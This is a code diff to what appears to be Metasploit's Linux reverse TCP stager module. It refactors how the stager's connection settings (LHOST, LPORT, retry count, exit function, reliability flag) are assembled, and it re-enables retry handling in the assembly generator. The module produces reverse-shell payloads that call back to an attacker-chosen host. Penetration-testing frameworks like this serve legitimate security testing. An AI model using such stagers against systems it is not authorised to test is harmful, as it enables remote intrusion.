@@ -1,7 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
-require 'msf/core/transport_config'
+require 'msf/core/payload/transport_config'
 require 'msf/core/payload/linux'
 
 module Msf
@@ -16,29 +16,25 @@ module Msf
 
 module Payload::Linux::ReverseTcp
 
-  include Msf::TransportConfig
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
 
   #
   # Generate the first stage
   #
   def generate
-    # Generate the simple version of this stager if we don't have enough space
-    if self.available_space.nil? || required_space > self.available_space
-      return generate_reverse_tcp(
-        port: datastore['LPORT'],
-        host: datastore['LHOST'],
-        retry_count: datastore['ReverseConnectRetries'],
-      )
-    end
-
     conf = {
-      host: datastore['LHOST'],
-      port: datastore['LPORT'],
+      port:        datastore['LPORT'],
+      host:        datastore['LHOST'],
       retry_count: datastore['ReverseConnectRetries'],
-      exitfunk: datastore['EXITFUNC'],
-      reliable: true
+      reliable:    false
     }
+
+    # Generate the advanced stager if we have space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:exitfunk] = datastore['EXITFUNC']
+      conf[:reliable] = true
+    end
 
     generate_reverse_tcp(conf)
   end
@@ -79,8 +75,8 @@ module Payload::Linux::ReverseTcp
   #
   def asm_reverse_tcp(opts={})
     # TODO: reliability is coming
-    #retry_count  = [opts[:retry_count].to_i, 1].max
-    #reliable     = opts[:reliable]
+    retry_count  = [opts[:retry_count].to_i, 1].max
+    reliable     = opts[:reliable]
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
 
